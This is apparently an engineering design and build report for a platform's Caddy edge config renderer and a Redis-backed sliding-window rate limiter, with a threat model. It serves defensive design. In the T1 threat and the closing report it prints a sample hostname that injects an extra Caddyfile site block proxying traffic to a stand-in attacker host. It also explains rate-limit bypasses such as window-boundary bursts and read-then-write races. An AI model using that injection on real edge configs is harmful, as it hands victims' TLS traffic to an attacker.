# Phase 32 — The edge, and one rate limit that actually holds

Two things a platform gets exactly one chance to get right, because both sit in front of everything
else: **who is allowed to reach us**, and **how often**.

We have neither. There is no edge — no TLS terminator, no single public listener, no place to put a
security header once. And the rate limit, such as it is, is a per-pod in-memory counter: run three
replicas and an attacker gets three times the budget, because each pod is counting on its own.

Both `ammar` and `Security-tools` already solved the edge with Caddy, and both got real things
right. This phase steals what they got right, fixes what they got wrong, and refuses the one thing
neither of them guarded.

---

## The invariant that makes this cheap

**The edge is RENDERED from config, never hand-written.**

`Security-tools` says it best in its own docstring: the domain comes from ONE place, *"so the cert,
the routing host, and the URLs the CLI/UI use can never drift."* A hand-edited Caddyfile is a
fourth source of truth that agrees with the other three right up until it doesn't.

So the edge is a pure function: `config -> edge config text`. No Caddy binary needed to test it, no
cluster needed to render it, and the renderer is a **port** — `caddy` today, `nginx` the day
someone needs it, without touching a single call site.

```
EdgeRenderer (port)
  caddy   (built)     -> Caddyfile
  nginx   (later)     -> nginx.conf
```

---

## 1. Definition of Done

### (1) Is this on the hot path?

**The rate limiter is THE hot path** — it runs before every request in the platform, including the
ones it is about to reject. Two consequences:

* The check must be **one round trip**, not a read-then-write race. A GET-then-SET limiter under
  load lets N concurrent requests all read the same count and all decide they are under the limit.
* A Redis outage must not take the platform down **or** open the door. See (4).

The renderer is not on any hot path: it runs at deploy time. It is pure, and a benchmark would be
theatre.

### (2) Does every config knob have a consumer?

Every limit, every window, every key component, every route class, and every header is config with
a real consumer, and the knob-guard test enforces it. `TENANT_TOMBSTONE_RETENTION_DAYS` was caught
by that guard last phase and deleted; the same rule applies here and I expect it to catch me again.

### (3) What production needs that "add a rate limiter" omits

* **A shared counter, or it is not a rate limit.** The current memory driver counts per POD. Three
  replicas, three counters, three times the budget. That is not a limit, it is a suggestion.
* **A `Retry-After` header.** A 429 with no `Retry-After` tells a client to guess, and clients
  guess by retrying immediately. `ammar` gets this right and it is worth copying exactly.
* **An operator unblock.** Someone WILL be locked out by a misconfigured limit at 3am. If the only
  remedy is `FLUSHALL`, the operator will use it, and take every other limit with it.
* **The limiter must be TESTED.** `ammar` disables it entirely under test (`skip: () => isTest`),
  so the code that protects the platform is the only code never exercised. Ours runs in tests, with
  an injected clock so it is deterministic.

### (4) The correctness footgun

**Redis goes down. What happens?**

`ammar` makes it a binary admin choice and both branches are bad:

* **fail-closed** → `increment()` throws → **HTTP 500** → the site is down. A rate limiter that
  causes the outage it exists to prevent.
* **fail-open** → no limit at all → an attacker who can degrade Redis has removed the rate limit,
  which means the rate limit is only as strong as Redis's availability.

**Neither. Degrade to the LOCAL limiter.** On a Redis outage each pod falls back to its own
in-memory counter with the same policy. The limit becomes coarser (N pods × budget instead of one
shared budget) and it keeps working. Coarse is not perfect. Coarse is enormously better than *off*,
and it is strictly better than *down*.

The second footgun is quieter, and it is the one this phase exists to refuse. See T1.

---

## 2. Steps

| # | Step |
| --- | --- |
| 32.1 | `EdgeRenderer` port + `caddy` adapter. Pure `config -> text`. No Caddy binary to test |
| 32.2 | **Hostname validation before rendering** (RFC-1123 / IP literal). T1 |
| 32.3 | Security headers, HSTS **only when actually HTTPS**, `-Server` |
| 32.4 | Caddy runs non-root, all caps dropped, read-only root. Neither source repo does this |
| 32.5 | `RateLimitPolicy` core: sliding window, composite key, per-route class, cost weights |
| 32.6 | Redis adapter: **atomic** (one round trip), and **degrades to local** on outage |
| 32.7 | `Retry-After` + `RateLimit-*` headers; operator unblock endpoint |
| 32.8 | **GATE `safety:edge`** — the rendered config is valid, and no unvalidated value reaches it |
| 32.9 | Tests: the boundary burst, the outage, the injection, the multi-pod counter |

## 3. Out of scope

**A WAF.** Caddy is a reverse proxy, not a web application firewall, and pretending otherwise gives
a false sense of protection. If a WAF is needed it is a real product decision, not a `header` block.

**nginx.** The port exists so nginx is a second renderer rather than a rewrite. It is not built,
and there is no inert `nginx` driver sitting in the registry pretending to be one.

## 4. What this design refuses to do

**It will not interpolate an unvalidated string into the edge config.** Not a hostname, not a
header value, not a path. See T1 — this is the one both source repos leave open, and it is the one
that ends with the attacker owning the edge.

---

## 5. Threat model — the edge is the one machine every request touches

### T1 — Edge-config injection  (CWE-74, CWE-94) — CRITICAL, and the one neither repo guards

The domain is operator-supplied and interpolated into the Caddyfile. A Caddyfile is not data; it is
a **configuration language**. A hostname of:

```
evil.com {
  reverse_proxy https://attacker.example
}
example.com
```

does not produce an invalid config. It produces a **valid** one with an extra site block that
proxies traffic to the attacker — TLS terminated by us, with our cert, looking exactly like us.

`Security-tools` validates the host (RFC-1123) before it reaches the renderer and passes it as an
argv element, never a shell string. That instinct is right and it is the single most important line
in their edge. `ammar` interpolates `{$CADDY_DOMAIN}` from the environment, which is safe only for
as long as nobody ever lets a user set it.

*Mitigation:* **every** value reaching the renderer is validated against a strict allowlist pattern
first — hostnames RFC-1123 or IP literal, upstreams `host:port`, paths a restricted charset. A
value that does not match does not get escaped; it is **REFUSED**. Escaping a config language is a
game you lose eventually. Gated by `safety:edge`, mutation-tested.

### T2 — The rate limit that is not one  (CWE-770) — HIGH

The in-memory limiter counts per pod. Three replicas, three counters. An attacker gets 3× the
budget and we call it a limit.

*Mitigation:* the shared (redis) driver is the default for any deployment with more than one
replica, and the chart refuses `replicas > 1` with `RATELIMITER_DRIVER=memory` — a limit that
silently multiplies with your scale is worse than no limit, because you believe in it.

### T3 — The window-boundary burst  (CWE-770) — HIGH, and invisible

A fixed-window counter (`INCR` + `EXPIRE`, which is exactly what `ammar` does) allows **2× the
budget** across a boundary: burn the full budget in the last second of the window, then the full
budget again in the first second of the next. The graph looks fine. The origin sees a spike of
double the number you configured.

*Mitigation:* a **sliding window** (GCRA-style): the cost of a request is checked against a
continuously-decaying allowance, so there is no boundary to straddle. A test drives exactly this
attack against both algorithms and asserts the fixed window fails it.

### T4 — Redis outage becomes an outage, or an open door  (CWE-703) — HIGH

Covered in DoD (4). Fail-closed = 500 = we caused the outage. Fail-open = no limit = the limiter is
only as strong as Redis's uptime.

*Mitigation:* **degrade to local.** Coarser, still limiting, never down.

### T5 — The read-then-write race  (CWE-362) — HIGH

`if count < max: count += 1` is two round trips. Under load, N concurrent requests all read the
same count, all pass, all increment. The limit is exceeded by exactly the concurrency.

*Mitigation:* the check and the increment are **one atomic operation** (a Lua script / a single
`INCR`-family call). The in-memory adapter holds a lock. A concurrency test fires 200 requests at a
limit of 10 and demands exactly 10 pass.

### T6 — Lockout by rate limit  (CWE-645) — MEDIUM, and `ammar` got this right

`ammar`'s login limiter counts **only 401s, never 403s**: a correct password on an account pending
approval must not count toward a brute-force lockout, or the user is locked out *while waiting for
the approval that would let them in*, and the approval does not clear it.

*Mitigation:* stolen wholesale, and generalised — **which statuses count is config**
(`RATELIMIT_COUNT_STATUSES`), because "a failed attempt" is a platform's definition, not ours.

### T7 — One NAT, one bucket  (availability) — MEDIUM

Keyed on IP alone, an office behind one NAT shares a single budget, and one enthusiastic user
throttles their colleagues.

*Mitigation:* the key is **composite and configurable** — `ip`, `subject`, `tenant`, `route`, in
any combination. An authenticated request keys on the subject (fair), an anonymous one on the IP
(all we have).

### T8 — HSTS on plain HTTP  (false assurance) — LOW

An `HSTS` header served over `http://` does nothing except make you believe you are protected.
`Security-tools` emits it only when ACME is actually on. Correct, and copied.

### T9 — The edge runs as root — MEDIUM, and BOTH repos do this

`Security-tools`'s Caddy pod has no `securityContext` at all: root, every capability, writable
filesystem. It is the one container in the cluster that talks to the entire internet.

*Mitigation:* non-root, `drop: [ALL]`, `readOnlyRootFilesystem`, `seccompProfile: RuntimeDefault`,
with writable volumes only where Caddy genuinely needs them (`/data` for the ACME account and
certs, `/config`). Our chart already demands this of every service; the edge does not get an
exemption for being important.

### T10 — A `Retry-After`-less 429  (self-inflicted DoS) — MEDIUM

A client told "too many requests" and not told *when* will retry immediately. A thundering herd of
429'd clients is a DoS you built yourself.

*Mitigation:* `Retry-After` on every 429, plus the `RateLimit-*` headers so a well-behaved client
can pace itself before it is ever rejected.

## 6. The gate: `safety:edge`

The edge config is the one file where a mistake is remotely exploitable, so it gets a gate, and it
is mutation-tested:

1. Every value interpolated into the rendered config comes from a **validated** field.
2. A hostname containing a Caddyfile metacharacter (`{`, `}`, newline, whitespace) is **REFUSED**,
   not escaped.
3. HSTS appears **only** when TLS is actually on.
4. The rendered config **parses** (`caddy validate` where the binary exists; a structural check
   where it does not — a gate that silently skips is a gate that lies).
5. The edge container is non-root, drops ALL capabilities, and has a read-only root filesystem.
6. `replicas > 1` with a per-pod rate limiter is a **FAILURE**, not a warning.

---

## 7. What was built

Learned from `ammar` and `Security-tools`, and beaten on every axis they left open.

| From the source repos | What we took | What we fixed |
| --- | --- | --- |
| Security-tools: render the edge from one config | render-from-one-source, testable with no Caddy binary | added **injection refusal** — they interpolate a validated host but a Caddyfile is a *language* |
| Security-tools: pre-validate the hostname (RFC-1123) | the instinct, hardened into an allowlist that **refuses**, never escapes | extended to upstreams, paths, headers |
| Security-tools: HSTS only with ACME on | copied exactly (T8) | — |
| ammar: named limiters (api/auth/login) | route **classes**, config-driven | + per-route **cost weights** |
| ammar: login counts 401 not 403 | the exact insight (T6) | generalised to `RATELIMIT_COUNT_STATUSES` + a GCRA **refund** |
| ammar: `Retry-After` from resetTime | copied exactly (T10) | + `RateLimit-*` on every response so a client paces itself |
| ammar: fixed window (INCR/EXPIRE) | — | **sliding window (GCRA)** — no boundary burst (T3) |
| ammar: fail-open OR fail-closed on outage | — | **degrade to local** — coarser, alive, never down and never open (T4) |
| both: Caddy as root | — | non-root, `drop:[ALL]`, read-only root, seccomp (T9) |

**Proven, not asserted.** The injection is demonstrated against the real Caddy binary: a hostname
of `evil.com { reverse_proxy https://attacker }` makes Caddy render a **valid** two-site config —
`caddy validate` prints "Valid configuration" — that TLS-terminates for the attacker. Our validator
refuses it; Caddy would have served it. The GCRA limiter is proven against a real Redis: atomic
under 200-way concurrency (a GET-then-SET limiter let 20 through a limit of 10 — a genuine bug the
test caught), no boundary burst, and all three degrade modes.

**A real catch worth recording:** under burst, redis-py's pool raises `MaxConnectionsError`, which
my first cut treated as an outage and degraded to local — handing the burst a *second independent
budget*, so the limit silently doubled under load. Fixed with a blocking pool: backpressure queues,
it is not an outage.

**Gate:** `safety:edge`, mutation-tested (5 mutations, all caught), PROVEN able to fail. The limiter
core (sliding window + atomic + degrade + refund) is propagated to all 17 services + the template.

**STATUS: ✅ BUILT.** 286 identity tests pass; `safety:edge` PROVEN.
